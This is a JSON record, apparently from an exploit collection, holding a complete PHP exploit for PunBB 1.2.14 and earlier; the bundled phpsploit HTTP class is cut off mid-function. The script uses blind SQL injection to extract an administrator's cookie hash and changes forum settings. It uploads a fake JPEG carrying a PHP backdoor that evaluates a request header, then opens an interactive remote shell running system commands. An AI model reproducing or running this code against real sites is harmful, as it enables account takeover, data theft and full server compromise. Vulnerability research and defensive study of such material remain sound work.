{
  "id": "3710",
  "title": "PunBB 1.2.14 - Remote Code Execution",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php\r\n<?php\r\nerror_reporting(E_ALL ^ E_NOTICE);\r\n\r\nif($argc < 7)\r\n{\r\nprint(\"\r\n-----------  PunBB <= 1.2.14 Remote Code Execution Exploit  -----------\r\n-----------------------------------------------------------------------\r\nPHP conditions: See www.acid-root.new.fr/advisories/13070411.txt\r\n       Credits: DarkFig <gmdarkfig@gmail.com>\r\n           URL: http://www.acid-root.new.fr/\r\n-----------------------------------------------------------------------\r\n  Usage: $argv[0] -url <> -usr <> -pwd <> [Options]\r\n Params: -url       For example http://victim.com/punBB/\r\n         -usr       User account (1 post at least)\r\n         -pwd       Password account\r\nOptions: -uid       Admin id (default=2)\r\n         -prefix    Table prefix (default=none)\r\n         -proxy     If you wanna use a proxy <proxyhost:proxyport> \r\n         -proxyauth Basic authentification <proxyuser:proxypwd>\r\n-----------------------------------------------------------------------\r\n\");exit(1);\r\n}\r\n\r\n$url = getparam('url',1);\r\n$usr = getparam('usr',1);\r\n$pwd = getparam('pwd',1);\r\n$uid = (getparam('uid')!='') ? getparam('uid') : 2;\r\n$pre = getparam('prefix');\r\n$prox= getparam('proxy');\r\n$proh= getparam('proxyauth');\r\n\r\n$xpl = new phpsploit();\r\n$xpl->agent(\"Mozilla Firefox\");\r\nif(!empty($prox)) $xpl->addproxy($prox);\r\nif(!empty($proh)) $xpl->proxyauth($proh);\r\n\r\n$xpl->cookiejar(1);\r\n$xpl->post($url.'login.php?action=in',\"form_sent=1&redirect_url=x&req_username=$usr&req_password=$pwd&login=1\");\r\n\r\nprint \"\\nCookie hash: \";$cookie = blind($uid);\r\nprint \"\\nAdmin cookie: \".$cookie;\r\n\r\n# Logged in as Administrator\r\n$xpl->reset('cookie');\r\n$xpl->addcookie($cookie);\r\n\r\n# Avatars dir -> include/user\r\n# Default options (french)\r\n$data =\r\n'form_sent=1&form%5Bboard_title%5D=Mon+forum+punBB&form%5Bboar'\r\n.'d_desc%5D=Malheureusement+personne+ne+peut+vous+dire+ce+que+'\r\n.'PunBB+est+-+vous+devez+le+voir+par+vous-m%EAme.&form%5Bbase_'\r\n.'url%5D='.urlencode(preg_replace(\"#(.*)/$#\",\"$1\",$url)).'&form%5B'\r\n.'server_timezone%5D=0&form%5Bdefault_lang%5D=English&form%5Bd'\r\n.'efault_style%5D=Oxygen&form%5Btime_format%5D=H%3Ai%3As&form%'\r\n.'5Bdate_format%5D=d-m-Y&form%5Btimeout_visit%5D=600&form%5Bti'\r\n.'meout_online%5D=300&form%5Bredirect_delay%5D=1&form%5Bshow_v'\r\n.'ersion%5D=0&form%5Bshow_user_info%5D=1&form%5Bshow_post_coun'\r\n.'t%5D=1&form%5Bsmilies%5D=1&form%5Bsmilies_sig%5D=1&form%5Bma'\r\n.'ke_links%5D=1&form%5Btopic_review%5D=15&form%5Bdisp_topics_d'\r\n.'efault%5D=30&form%5Bdisp_posts_default%5D=25&form%5Bindent_n'\r\n.'um_spaces%5D=4&form%5Bquickpost%5D=1&form%5Busers_online%5D='\r\n.'1&form%5Bcensoring%5D=0&form%5Branks%5D=1&form%5Bshow_dot%5D'\r\n.'=0&form%5Bquickjump%5D=1&form%5Bgzip%5D=0&form%5Bsearch_all_'\r\n.'forums%5D=1&form%5Badditional_navlinks%5D=&form%5Breport_met'\r\n.'hod%5D=0&form%5Bregs_report%5D=0&form%5Bmailing_list%5D=gmda'\r\n.'rkfig%40gmail.com&form%5Bavatars%5D=1&form%5Bavatars_dir%5D='\r\n.'include%2Fuser&form%5Bavatars_width%5D=60&form%5Bavatars_hei'\r\n.'ght%5D=60&form%5Bavatars_size%5D=10240&form%5Badmin_email%5D'\r\n.'=mysploiti%40gmail.com&form%5Bwebmaster_email%5D=mysploiti%4'\r\n.'0gmail.com&form%5Bsubscriptions%5D=1&form%5Bsmtp_host%5D=&fo'\r\n.'rm%5Bsmtp_user%5D=&form%5Bsmtp_pass%5D=&form%5Bregs_allow%5D'\r\n.'=1&form%5Bregs_verify%5D=0&form%5Brules%5D=0&form%5Brules_me'\r\n.'ssage%5D=Saisissez+vos+r%E8gles+ici.&form%5Bannouncement%5D='\r\n.'0&form%5Bannouncement_message%5D=Saisissez+votre+annonce+ici'\r\n.'.&form%5Bmaintenance%5D=0&form%5Bmaintenance_message%5D=Les+'\r\n.'forums+sont+temporairement+ferm%E9s+pour+des+raisons+de+main'\r\n.'tenance.+Veuillez+essayer+%E0+nouveau+dans+quelques+minutes.'\r\n.'%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%2FAdministrateur&save=+'\r\n.'Enregistrer+';\r\n\r\n$xpl->addheader('Referer',$url.'admin_options.php');\r\n$xpl->post($url.'admin_options.php?action=foo',$data);\r\n\r\n\r\n# Fake JPG 1x1\r\n#\r\n# 000000A2 3C3F 7068 7020 2468 616E 646C 653D 666F <?php $handle=fo\r\n# 000000B2 7065 6E28 222E 2F69 6D67 2F61 7661 7461 pen(\"./img/avata\r\n# 000000C2 7273 2F62 6163 6B64 6F6F 722E 7068 7022 rs/backdoor.php\"\r\n# 000000D2 2C22 7722 293B 2066 7772 6974 6528 2468 ,\"w\"); fwrite($h\r\n# 000000E2 616E 646C 652C 273C 3F70 6870 2069 6628 andle,'<?php if(\r\n# 000000F2 6973 7365 7428 245F 5345 5256 4552 5B22 isset($_SERVER[\"\r\n# 00000102 4854 5450 5F53 4845 4C4C 225D 2929 2040 HTTP_SHELL\"])) @\r\n# 00000112 6576 616C 2824 5F53 4552 5645 525B 2248 eval($_SERVER[\"H\r\n# 00000122 5454 505F 5348 454C 4C22 5D29 3B20 3F3E TTP_SHELL\"]); ?\\>\r\n# 00000132 2729 3B20 6663 6C6F 7365 2824 6861 6E64 '); fclose($hand\r\n# 00000142 6C65 293B 203F 3E                       le); ?\\>    \r\n$avatar =\r\n\"\\xFF\\xD8\\xFF\\xE0\\x00\\x10\\x4A\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x60\"\r\n.\"\\x00\\x60\\x00\\x00\\xFF\\xDB\\x00\\x43\\x00\\x08\\x06\\x06\\x07\\x06\\x05\"\r\n.\"\\x08\\x07\\x07\\x07\\x09\\x09\\x08\\x0A\\x0C\\x14\\x0D\\x0C\\x0B\\x0B\\x0C\"\r\n.\"\\x19\\x12\\x13\\x0F\\x14\\x1D\\x1A\\x1F\\x1E\\x1D\\x1A\\x1C\\x1C\\x20\\x24\"\r\n.\"\\x2E\\x27\\x20\\x22\\x2C\\x23\\x1C\\x1C\\x28\\x37\\x29\\x2C\\x30\\x31\\x34\"\r\n.\"\\x34\\x34\\x1F\\x27\\x39\\x3D\\x38\\x32\\x3C\\x2E\\x33\\x34\\x32\\xFF\\xDB\"\r\n.\"\\x00\\x43\\x01\\x09\\x09\\x09\\x0C\\x0B\\x0C\\x18\\x0D\\x0D\\x18\\x32\\x21\"\r\n.\"\\x1C\\x21\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\"\r\n.\"\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\"\r\n.\"\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\"\r\n.\"\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\xFF\\xFE\\x00\\xA9\\x3C\\x3F\\x70\\x68\"\r\n.\"\\x70\\x20\\x24\\x68\\x61\\x6E\\x64\\x6C\\x65\\x3D\\x66\\x6F\\x70\\x65\\x6E\"\r\n.\"\\x28\\x22\\x2E\\x2F\\x69\\x6D\\x67\\x2F\\x61\\x76\\x61\\x74\\x61\\x72\\x73\"\r\n.\"\\x2F\\x62\\x61\\x63\\x6B\\x64\\x6F\\x6F\\x72\\x2E\\x70\\x68\\x70\\x22\\x2C\"\r\n.\"\\x22\\x77\\x22\\x29\\x3B\\x20\\x66\\x77\\x72\\x69\\x74\\x65\\x28\\x24\\x68\"\r\n.\"\\x61\\x6E\\x64\\x6C\\x65\\x2C\\x27\\x3C\\x3F\\x70\\x68\\x70\\x20\\x69\\x66\"\r\n.\"\\x28\\x69\\x73\\x73\\x65\\x74\\x28\\x24\\x5F\\x53\\x45\\x52\\x56\\x45\\x52\"\r\n.\"\\x5B\\x22\\x48\\x54\\x54\\x50\\x5F\\x53\\x48\\x45\\x4C\\x4C\\x22\\x5D\\x29\"\r\n.\"\\x29\\x20\\x40\\x65\\x76\\x61\\x6C\\x28\\x24\\x5F\\x53\\x45\\x52\\x56\\x45\"\r\n.\"\\x52\\x5B\\x22\\x48\\x54\\x54\\x50\\x5F\\x53\\x48\\x45\\x4C\\x4C\\x22\\x5D\"\r\n.\"\\x29\\x3B\\x20\\x3F\\x3E\\x27\\x29\\x3B\\x20\\x66\\x63\\x6C\\x6F\\x73\\x65\"\r\n.\"\\x28\\x24\\x68\\x61\\x6E\\x64\\x6C\\x65\\x29\\x3B\\x20\\x3F\\x3E\\xFF\\xC0\"\r\n.\"\\x00\\x11\\x08\\x00\\x01\\x00\\x01\\x03\\x01\\x22\\x00\\x02\\x11\\x01\\x03\"\r\n.\"\\x11\\x01\\xFF\\xC4\\x00\\x1F\\x00\\x00\\x01\\x05\\x01\\x01\\x01\\x01\\x01\"\r\n.\"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x03\\x04\\x05\\x06\"\r\n.\"\\x07\\x08\\x09\\x0A\\x0B\\xFF\\xC4\\x00\\xB5\\x10\\x00\\x02\\x01\\x03\\x03\"\r\n.\"\\x02\\x04\\x03\\x05\\x05\\x04\\x04\\x00\\x00\\x01\\x7D\\x01\\x02\\x03\\x00\"\r\n.\"\\x04\\x11\\x05\\x12\\x21\\x31\\x41\\x06\\x13\\x51\\x61\\x07\\x22\\x71\\x14\"\r\n.\"\\x32\\x81\\x91\\xA1\\x08\\x23\\x42\\xB1\\xC1\\x15\\x52\\xD1\\xF0\\x24\\x33\"\r\n.\"\\x62\\x72\\x82\\x09\\x0A\\x16\\x17\\x18\\x19\\x1A\\x25\\x26\\x27\\x28\\x29\"\r\n.\"\\x2A\\x34\\x35\\x36\\x37\\x38\\x39\\x3A\\x43\\x44\\x45\\x46\\x47\\x48\\x49\"\r\n.\"\\x4A\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5A\\x63\\x64\\x65\\x66\\x67\\x68\"\r\n.\"\\x69\\x6A\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7A\\x83\\x84\\x85\\x86\\x87\"\r\n.\"\\x88\\x89\\x8A\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\xA2\\xA3\\xA4\"\r\n.\"\\xA5\\xA6\\xA7\\xA8\\xA9\\xAA\\xB2\\xB3\\xB4\\xB5\\xB6\\xB7\\xB8\\xB9\\xBA\"\r\n.\"\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7\\xC8\\xC9\\xCA\\xD2\\xD3\\xD4\\xD5\\xD6\\xD7\"\r\n.\"\\xD8\\xD9\\xDA\\xE1\\xE2\\xE3\\xE4\\xE5\\xE6\\xE7\\xE8\\xE9\\xEA\\xF1\\xF2\"\r\n.\"\\xF3\\xF4\\xF5\\xF6\\xF7\\xF8\\xF9\\xFA\\xFF\\xC4\\x00\\x1F\\x01\\x00\\x03\"\r\n.\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n.\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0A\\x0B\\xFF\\xC4\\x00\\xB5\"\r\n.\"\\x11\\x00\\x02\\x01\\x02\\x04\\x04\\x03\\x04\\x07\\x05\\x04\\x04\\x00\\x01\"\r\n.\"\\x02\\x77\\x00\\x01\\x02\\x03\\x11\\x04\\x05\\x21\\x31\\x06\\x12\\x41\\x51\"\r\n.\"\\x07\\x61\\x71\\x13\\x22\\x32\\x81\\x08\\x14\\x42\\x91\\xA1\\xB1\\xC1\\x09\"\r\n.\"\\x23\\x33\\x52\\xF0\\x15\\x62\\x72\\xD1\\x0A\\x16\\x24\\x34\\xE1\\x25\\xF1\"\r\n.\"\\x17\\x18\\x19\\x1A\\x26\\x27\\x28\\x29\\x2A\\x35\\x36\\x37\\x38\\x39\\x3A\"\r\n.\"\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4A\\x53\\x54\\x55\\x56\\x57\\x58\\x59\"\r\n.\"\\x5A\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6A\\x73\\x74\\x75\\x76\\x77\\x78\"\r\n.\"\\x79\\x7A\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x92\\x93\\x94\\x95\"\r\n.\"\\x96\\x97\\x98\\x99\\x9A\\xA2\\xA3\\xA4\\xA5\\xA6\\xA7\\xA8\\xA9\\xAA\\xB2\"\r\n.\"\\xB3\\xB4\\xB5\\xB6\\xB7\\xB8\\xB9\\xBA\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7\\xC8\"\r\n.\"\\xC9\\xCA\\xD2\\xD3\\xD4\\xD5\\xD6\\xD7\\xD8\\xD9\\xDA\\xE2\\xE3\\xE4\\xE5\"\r\n.\"\\xE6\\xE7\\xE8\\xE9\\xEA\\xF2\\xF3\\xF4\\xF5\\xF6\\xF7\\xF8\\xF9\\xFA\\xFF\"\r\n.\"\\xDA\\x00\\x0C\\x03\\x01\\x00\\x02\\x11\\x03\\x11\\x00\\x3F\\x00\\xF7\\xFA\"\r\n.\"\\x28\\xA2\\x80\\x3F\\xFF\\xD9\";\r\n\r\n# Upload\r\n$formdata = array(frmdt_url => $url.'profile.php?action=upload_avatar2&id='.$uid,\r\n                  'form_sent' => '1',\r\n                  'MAX_FILE_SIZE' => '10240',\r\n                  'upload' => 'T\u00e9l\u00e9charger',\r\n                  'req_file' => array(frmdt_filename => 'pic.jpg',\r\n                                      frmdt_type => 'image/jpeg',\r\n                                      frmdt_content => $avatar));\r\n\r\n$xpl->addheader('Referer',$url.'profile.php');\r\n$xpl->formdata($formdata);\r\n\r\n# File inclusion\r\n$xpl->addheader('Referer',$url.\"misc.php\\\"><pun_include \\\"$uid.jpg\\\">\");\r\n$xpl->get($url.'misc.php?email='.$uid);\r\nprint \"\\nThe php code shoulb be executed\\n\\$shell> \";\r\n\r\n# Hello \r\nwhile(!preg_match(\"#^(quit|exit)$#\",($cmd = trim(fgets(STDIN)))))\r\n{\r\n    # ');include('../../config.php');print $db_password;//\r\n    $xpl->addheader('Shell',\"system('$cmd');\");\r\n    $xpl->get($url.'img/avatars/backdoor.php');\r\n    print $xpl->getcontent().\"\\n\\$shell> \";\r\n}\r\n\r\nfunction blind($id)\r\n{\r\n\tglobal $xpl,$url,$usr,$pre;\r\n\t\r\n\tpreg_match(\"#^(\\S*)=(\\S*);#\",$xpl->showcookie(),$cookies);\r\n\t$name=$cookies[1].\"=\";\r\n\t$string=\"a:2:{i:0;s:1:\\\"$id\\\";i:1;s:32:\\\"\";\r\n\t\r\n\tfor($i=1;$i<=32;$i++)\r\n\t{\r\n\t\t$charset = '0123456789abcdef';\r\n\t\tfor($a=0;$a<=strlen($charset);$a++)\r\n\t\t{\r\n\t\t\t# Search cache\r\n\t\t\t$searchd = 'search.php?action=search&keywords=*****&author='\r\n\t\t\t          .$usr.'&forum=-1&search_in=all&sort_by=0&sort_dir=DESC&show_as=topics&search=1';\r\n\t\t\t$xpl->get($url.$searchd);\r\n\r\n\t\t\t# Cookie hash\r\n\t\t\t$sql = 'ORD(SUBSTR(('\r\n\t\t\t      .'SELECT MD5('\r\n\t\t\t      .'CONCAT('\r\n\t\t\t      .'SUBSTR('\r\n\t\t\t      .'MD5('\r\n\t\t\t      # Cookie seed\r\n\t\t\t      .'(SELECT registered FROM '.$pre.'users WHERE LENGTH(registered)=10'\r\n\t\t\t      .' ORDER BY registered LIMIT 1)),-8),'\r\n\t\t\t      # Hashed password\r\n\t\t\t      .'(SELECT password FROM '.$pre.'users WHERE id='.$id.')))),'.$i.',1))=ORD(CHAR('.ord($charset[$a]).')) #';\r\n\t\t\t      \r\n\t\t\t# SQL Injection\r\n\t\t\t$xpl->post($url.'search.php?action=show_new','search_id=-1 OR '.$sql.'&1986084953=1&-1234899993=1');\r\n\t\t\t\r\n\t\t\t# True\r\n\t\t\tif(preg_match('#<th class=\"tcr\" scope=\"col\">#',$xpl->getcontent()))\r\n\t\t\t{\r\n\t\t\t\tprint $charset[$a];\r\n\t\t\t\t$string .= $charset[$a];\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn $name.urlencode($string.'\";}');\r\n}\r\n\r\nfunction getparam($param,$opt='')\r\n{\r\n\tglobal $argv;\r\n\tforeach($argv as $value => $key)\r\n\t{\r\n\t\tif($key == '-'.$param) return $argv[$value+1];\r\n\t}\r\n\tif($opt) exit(\"\\n#3 -$param parameter required\");\r\n\telse return;\r\n}\r\n\r\n/*\r\n * \r\n * Copyright (C) darkfig\r\n * \r\n * This program is free software; you can redistribute it and/or \r\n * modify it under the terms of the GNU General Public License \r\n * as published by the Free Software Foundation; either version 2 \r\n * of the License, or (at your option) any later version. \r\n * \r\n * This program is distributed in the hope that it will be useful, \r\n * but WITHOUT ANY WARRANTY; without even the implied warranty of \r\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the \r\n * GNU General Public License for more details. \r\n * \r\n * You should have received a copy of the GNU General Public License \r\n * along with this program; if not, write to the Free Software \r\n * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\r\n * \r\n * TITLE:          PhpSploit Class\r\n * REQUIREMENTS:   PHP 5 (remove \"private\", \"public\" if you have PHP 4)\r\n * VERSION:        1.2\r\n * LICENSE:        GNU General Public License\r\n * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt\r\n * FILENAME:       phpsploitclass.php\r\n *\r\n * CONTACT:        gmdarkfig@gmail.com (french / english)\r\n * GREETZ:         Sparah, Ddx39\r\n *\r\n * DESCRIPTION:\r\n * The phpsploit is a class implementing a web user agent.\r\n * You can add cookies, headers, use a proxy server with (or without) a\r\n * basic authentification. It supports the GET and the POST method. It can\r\n * also be used like a browser with the cookiejar() function (which allow\r\n * a server to add several cookies for the next requests) and the\r\n * allowredirection() function (which allow the script to follow all\r\n * redirections sent by the server). It can return the content (or the\r\n * headers) of the request. Others useful functions can be used for debugging.\r\n * A manual is actually in development but to know how to use it, you can\r\n * read the comments.\r\n *\r\n * CHANGELOG:\r\n * [2007-01-24] (1.2)\r\n *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))\r\n *  * New: multipart/form-data enctype is now supported \r\n *\r\n * [2006-12-31] (1.1)\r\n *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)\r\n *  * New: You can now call the getheader() / getcontent() function without parameters\r\n *\r\n * [2006-12-30] (1.0)\r\n *  * First version\r\n * \r\n */\r\n\r\nclass phpsploit {\r\n\r\n\t/**\r\n\t * This function is called by the get()/post() functions.\r\n\t * You don't have to call it, this is the main function.\r\n\t *\r\n\t * @return $server_response\r\n\t */\r\n\tprivate function sock()\r\n\t{\r\n\t\tif(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);\r\n\t\telse $socket = fsockopen($this->host,$this->port);\r\n\t\t\r\n\t\tif(!$socket) die(\"Error: The host doesn't exist\");\r\n\t\t\r\n\t\tif($this->method===\"get\") $this->packet = \"GET \".$this->url.\" HTTP/1.1\\r\\n\";\r\n\t\telseif($this->method===\"post\" or $this->method===\"formdata\") $this->packet = \"POST \".$this->url. \" HTTP/1.1\\r\\n\";\r\n\t\telse die(\"Error: Invalid method\");\r\n\t\t\r\n\t\tif(!empty($this->proxyuser)) $this->packet .= \"Proxy-Authorization: Basic \".base64_encode($this->proxyuser.\":\".$this->proxypass).\"\\r\\n\";\r\n\t\t$this->packet .= \"Host: \".$this->host.\"\\r\\n\";\r\n\t\t\r\n\t\tif(!empty($this->agent))  $this->packet .= \"User-Agent: \".$this->agent.\"\\r\\n\";\r\n\t\tif(!empty($this->header)) $this->packet .= $this->header.\"\\r\\n\";\r\n\t\tif(!empty($this->cookie)) $this->packet .= \"Cookie: \".$this->cookie.\"\\r\\n\";\r\n\t\t\r\n\t\t$this->packet .= \"Connection: Close\\r\\n\";\r\n\t\tif($this->method===\"post\")\r\n\t\t{\r\n\t\t\t$this->packet .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t\t\t$this->packet .= \"Content-Length: \".strlen($this->data).\"\\r\\n\\r\\n\";\r\n\t\t\t$this->packet .= $this->data.\"\\r\\n\";\r\n\t\t}\r\n\t\telseif($this->method===\"formdata\")\r\n\t\t{\r\n\t\t\t$this->packet .= \"Content-Type: multipart/form-data; boundary=---------------------------\".$this->boundary.\"\\r\\n\";\r\n\t\t\t$this->packet .= \"Content-Length: \".strlen($this->data).\"\\r\\n\\r\\n\";\r\n\t\t\t$this->packet .= $this->data;\r\n\t\t}\r\n\t\t$this->packet .= \"\\r\\n\";\r\n\t\t$this->recv = '';\r\n\t\t\r\n\t\tfputs($socket,$this->packet);\r\n\t\twhile(!feof($socket)) $this->recv .= fgets($socket);\r\n\t\tfclose($socket);\r\n\t\t\r\n\t\tif($this->cookiejar) $this->cookiejar($this->getheader($this->recv));\r\n\t\tif($this->allowredirection) return $this->allowredirection($this->recv);\r\n\t\telse return $this->recv;\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to add several cookie in the\r\n\t * request. Several methods are supported:\r\n\t * \r\n\t * $this->addcookie(\"name\",\"value\");\r\n\t * or\r\n\t * $this->addcookie(\"name=newvalue\");\r\n\t * or\r\n\t * $this->addcookie(\"othername=overvalue; xx=zz; y=u\");\r\n\t * \r\n\t * @param string $cookiename\r\n\t * @param string $cookievalue\r\n\t * \r\n\t */\r\n\tpublic function addcookie($cookn,$cookv='')\r\n\t{\r\n\t\t// $this->addcookie(\"name\",\"value\"); work avec replace\r\n\t\tif(!empty($cookv))\r\n\t\t{\r\n\t\t\tif($cookv === \"deleted\") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete\r\n\t\t\tif(!empty($this->cookie))\r\n\t\t\t{\r\n\t\t\t    if(preg_match(\"/$cookn=/\",$this->cookie))\r\n\t\t\t    {\r\n\t\t\t    \t$this->cookie = preg_replace(\"/$cookn=(\\S*);/\",\"$cookn=$cookv;\",$this->cookie);\r\n\t\t\t    }\r\n\t\t\t    else\r\n\t\t\t    {\r\n\t\t\t    \t$this->cookie .= \" \".$cookn.\"=\".$cookv.\";\"; // \" \".\r\n\t\t\t    }\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$this->cookie = $cookn.\"=\".$cookv.\";\";\r\n\t\t\t}\r\n\t\t}\r\n\t\t// $this->addcookie(\"name=value; othername=othervalue\");\r\n\t\telse\r\n\t\t{\r\n\t    \t if(!empty($this->cookie))\r\n\t    \t {\r\n\t    \t \t$cookn = preg_replace(\"/(.*);$/\",\"$1\",$cookn);\r\n\t    \t \t$cookarr = explode(\";\",str_replace(\" \", \"\",$cookn));\r\n\t    \t \tfor($i=0;$i<count($cookarr);$i++)\r\n\t    \t \t{\r\n\t    \t \t\tpreg_match(\"/(\\S*)=(\\S*)/\",$cookarr[$i],$matches);\r\n\t    \t \t\t$cookn = $matches[1];\r\n\t    \t \t\t$cookv = $matches[2];\r\n\t    \t \t\t$this->addcookie($cookn,$cookv);\r\n\t    \t \t}\r\n\t    \t }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t \t$cookn = ((substr($cookn,(strlen($cookn)-1),1))===\";\") ? $cookn : $cookn.\";\";\r\n\t\t\t \t$this->cookie = $cookn;\t\t\t\r\n\t\t\t }\r\n\t\t}\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * This function allows you to add several headers in the\r\n\t * request. Several methods are supported:\r\n\t *\r\n\t * $this->addheader(\"headername\",\"headervalue\");\r\n\t * or\r\n\t * $this->addheader(\"headername: headervalue\");\r\n\t *\r\n\t * @param string $headername\r\n\t * @param string $headervalue\r\n\t */\r\n\tpublic function addheader($headern,$headervalue='')\r\n\t{\r\n\t\t// $this->addheader(\"name\",\"value\");\r\n\t\tif(!empty($headervalue))\r\n\t\t{\r\n\t\t\tif(!empty($this->header))\r\n\t\t\t{\r\n\t\t\t\tif(preg_match(\"/$headern:/\",$this->header))\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->header = preg_replace(\"/$headern: (\\S*)/\",\"$headern: $headervalue\",$this->header);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->header .= \"\\r\\n\".$headern.\": \".$headervalue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$this->header=$headern.\": \".$headervalue;\r\n\t\t\t}\r\n\t\t}\r\n\t\t// $this->addheader(\"name: value\");\r\n\t\telse \r\n\t\t{\r\n\t\t\tif(!empty($this->header))\r\n\t\t\t{\r\n\t\t\t\t$headarr = explode(\": \",$headern);\r\n\t\t\t\t$headern = $headarr[0];\r\n\t\t\t\t$headerv = $headarr[1];\r\n\t\t\t\t$this->addheader($headern,$headerv);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$this->header=$headern;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to use an http proxy server.\r\n\t * Several methods are supported:\r\n\t * \r\n\t * $this->proxy(\"proxyip\",\"8118\");\r\n\t * or\r\n\t * $this->proxy(\"proxyip:8118\")\r\n\t *\r\n\t * @param string $proxyhost\r\n\t * @param integer $proxyport\r\n\t */\r\n\tpublic function proxy($proxy,$proxyp='')\r\n\t{\r\n\t\t// $this->proxy(\"localhost:8118\");\r\n\t\tif(empty($proxyp))\r\n\t\t{\r\n\t\t\tpreg_match(\"/^(\\S*):(\\d+)$/\",$proxy,$proxarr);\r\n\t\t\t$proxh = $proxarr[1];\r\n\t\t\t$proxp = $proxarr[2];\r\n\t\t\t$this->proxyhost=$proxh;\r\n\t\t\t$this->proxyport=$proxp;\r\n\t\t}\r\n\t\t// $this->proxy(\"localhost\",8118);\r\n\t\telse \r\n\t\t{\r\n\t\t\t$this->proxyhost=$proxy;\r\n\t\t\t$this->proxyport=intval($proxyp);\r\n\t\t}\r\n\t\tif($this->proxyport > 65535) die(\"Error: Invalid port number\");\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to use an http proxy server\r\n\t * which requires a basic authentification. Several\r\n\t * methods are supported:\r\n\t * \r\n\t * $this->proxyauth(\"darkfig\",\"dapasswd\");\r\n\t * or\r\n\t * $this->proxyauth(\"darkfig:dapasswd\");\r\n\t *\r\n\t * @param string $proxyuser\r\n\t * @param string $proxypass\r\n\t */\r\n\tpublic function proxyauth($proxyauth,$proxypasse='')\r\n\t{\r\n\t\t// $this->proxyauth(\"darkfig:password\");\r\n\t\tif(empty($proxypasse))\r\n\t\t{\r\n\t\t\tpreg_match(\"/^(.*):(.*)$/\",$proxyauth,$proxautharr);\r\n\t\t\t$proxu = $proxautharr[1];\r\n\t\t\t$proxp = $proxautharr[2];\r\n\t\t\t$this->proxyuser=$proxu;\r\n\t\t\t$this->proxypass=$proxp;\r\n\t\t}\r\n\t\t// $this->proxyauth(\"darkfig\",\"password\");\r\n\t\telse\r\n\t\t{\r\n\t\t\t$this->proxyuser=$proxyauth;\r\n\t\t\t$this->proxypass=$proxypasse;\r\n\t\t}\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function allows you to set the \"User-Agent\" header.\r\n\t * Several methods are possible to do that:\r\n\t * \r\n\t * $this->agent(\"Mozilla Firefox\");\r\n\t * or\r\n\t * $this->addheader(\"User-Agent: Mozilla Firefox\");\r\n\t * or\r\n\t * $this->addheader(\"User-Agent\",\"Mozilla Firefox\");\r\n\t * \r\n\t * @param string $useragent\r\n\t */\r\n\tpublic function agent($useragent)\r\n\t{\r\n\t\t$this->agent=$useragent;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the header which will be\r\n\t * in the next request.\r\n\t * \r\n\t * $this->showheader();\r\n\t *\r\n\t * @return $header\r\n\t */\r\n\tpublic function showheader()\r\n\t{\r\n\t\treturn $this->header;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the cookie which will be\r\n\t * in the next request.\r\n\t * \r\n\t * $this->showcookie();\r\n\t *\r\n\t * @return $storedcookies\r\n\t */\r\n\tpublic function showcookie()\r\n\t{\r\n\t\treturn $this->cookie;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the last formed\r\n\t * http request (the http packet).\r\n\t * \r\n\t * $this->showlastrequest();\r\n\t * \r\n\t * @return $last_http_request\r\n\t */\r\n\tpublic function showlastrequest()\r\n\t{\r\n\t\treturn $this->packet;\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * This function sends the formed http packet with the\r\n\t * GET method. You can precise the port of the host.\r\n\t * \r\n\t * $this->get(\"http://localhost\");\r\n\t * $this->get(\"http://localhost:888/xd/tst.php\");\r\n\t * \r\n\t * @param string $urlwithpath\r\n\t * @return $server_response\r\n\t */\r\n\tpublic function get($url)\r\n\t{\r\n\t\t$this->target($url);\r\n\t\t$this->method=\"get\";\r\n\t\treturn 